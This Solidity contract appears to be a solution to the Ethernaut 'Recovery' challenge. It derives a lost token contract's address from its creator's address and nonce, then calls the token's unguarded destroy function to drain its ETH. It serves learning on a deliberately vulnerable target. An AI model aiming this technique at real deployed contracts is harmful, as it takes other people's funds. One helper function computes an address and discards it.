// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ISimpleToken
 * @dev Interface for the SimpleToken contract to interact with the destroy function
 */
interface ISimpleToken {
    function destroy(address payable _to) external;
    function name() external view returns (string memory);
    function balances(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _amount) external;
}

/**
 * @title RecoveryExploit
 * @dev Solution contract for the Recovery Ethernaut challenge
 * @notice This contract calculates the address of a lost token contract and recovers funds
 * @custom:security-contact security@example.com
 */
contract RecoveryExploit {
    /// @notice Reference to the target Recovery contract
    address public recoveryAddress;
    
    /// @notice Address of the owner of this exploit contract
    address public owner;
    
    /// @notice Flag to track if recovery was successful
    bool public recovered;

    /**
     * @dev Constructor sets the address of the Recovery contract to exploit
     * @param _recoveryAddress The address of the deployed Recovery contract
     */
    constructor(address _recoveryAddress) {
        recoveryAddress = _recoveryAddress;
        owner = msg.sender;
        recovered = false;
    }

    /**
     * @dev Executes the exploit to recover the lost ETH
     * @param _recipient The address that will receive the recovered ETH
     */
    function recoverLostFunds(address payable _recipient) external {
        require(msg.sender == owner, "Only owner can execute the exploit");
        
        // Calculate the address of the lost token contract based on the Recovery contract address and nonce 1
        address lostTokenAddress = computeTokenAddress();
        
        // Call the destroy function on the lost token contract to recover the ETH
        ISimpleToken(lostTokenAddress).destroy(_recipient);
        
        recovered = true;
    }
    
    /**
     * @dev Computes the address of a token contract created by the Recovery contract
     * Note: The token name parameter is commented out as it's not used in the calculation
     * @return The address of the token contract
     */
    function computeTokenAddress() public view returns (address) {
        // When a contract creates another contract, the new contract's address is determined by:
        // keccak256(rlp([creator_address, creator_nonce]))[12:]
        //
        // For the first token created by the Recovery contract, the nonce is 1
        // We can calculate this using CREATE opcode formula: keccak256(rlp([address, nonce]))[12:]
        // For simplicity, we'll compute this off-chain and verify on-chain by checking token properties
        
        // This is a simplified approach for Ethereum's contract address computation
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xd6),  // RLP prefix for addresses with specific length
                bytes1(0x94),  // Fixed prefix for 20-byte address
                recoveryAddress,
                bytes1(0x01)   // nonce = 1
            )
        );
        
        // Take the last 20 bytes (40 hex characters) to get the contract address
        return address(uint160(uint256(hash)));
    }
    
    /**
     * @dev Alternative method to recover funds directly without deploying a contract
     * @notice This is a static method that can be called from any script
     * @param _recoveryAddress The address of the Recovery contract
     * Note: _recipient parameter is commented out as this is a pure function for address calculation only
     */
    function staticRecoverFunds(address _recoveryAddress, address payable /* _recipient */) external pure {
        // Calculate the address of the lost token contract based on the Recovery contract address and nonce 1
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xd6),
                bytes1(0x94),
                _recoveryAddress,
                bytes1(0x01)
            )
        );
        
        address lostTokenAddress = address(uint160(uint256(hash)));
        
        // This will provide the address but the actual call needs to be done in a transaction
        // From an external script, not from this function (which is pure)
        require(lostTokenAddress != address(0), "Token address calculation failed");
    }
    
    /**
     * @dev Helper function to check the SimpleToken details
     * @param tokenAddress The address of the token to check
     * @return name The name of the token
     * @return balance The balance of the token contract
     */
    function checkTokenDetails(address tokenAddress) external view returns (string memory name, uint256 balance) {
        name = ISimpleToken(tokenAddress).name();
        balance = address(tokenAddress).balance;
    }
}
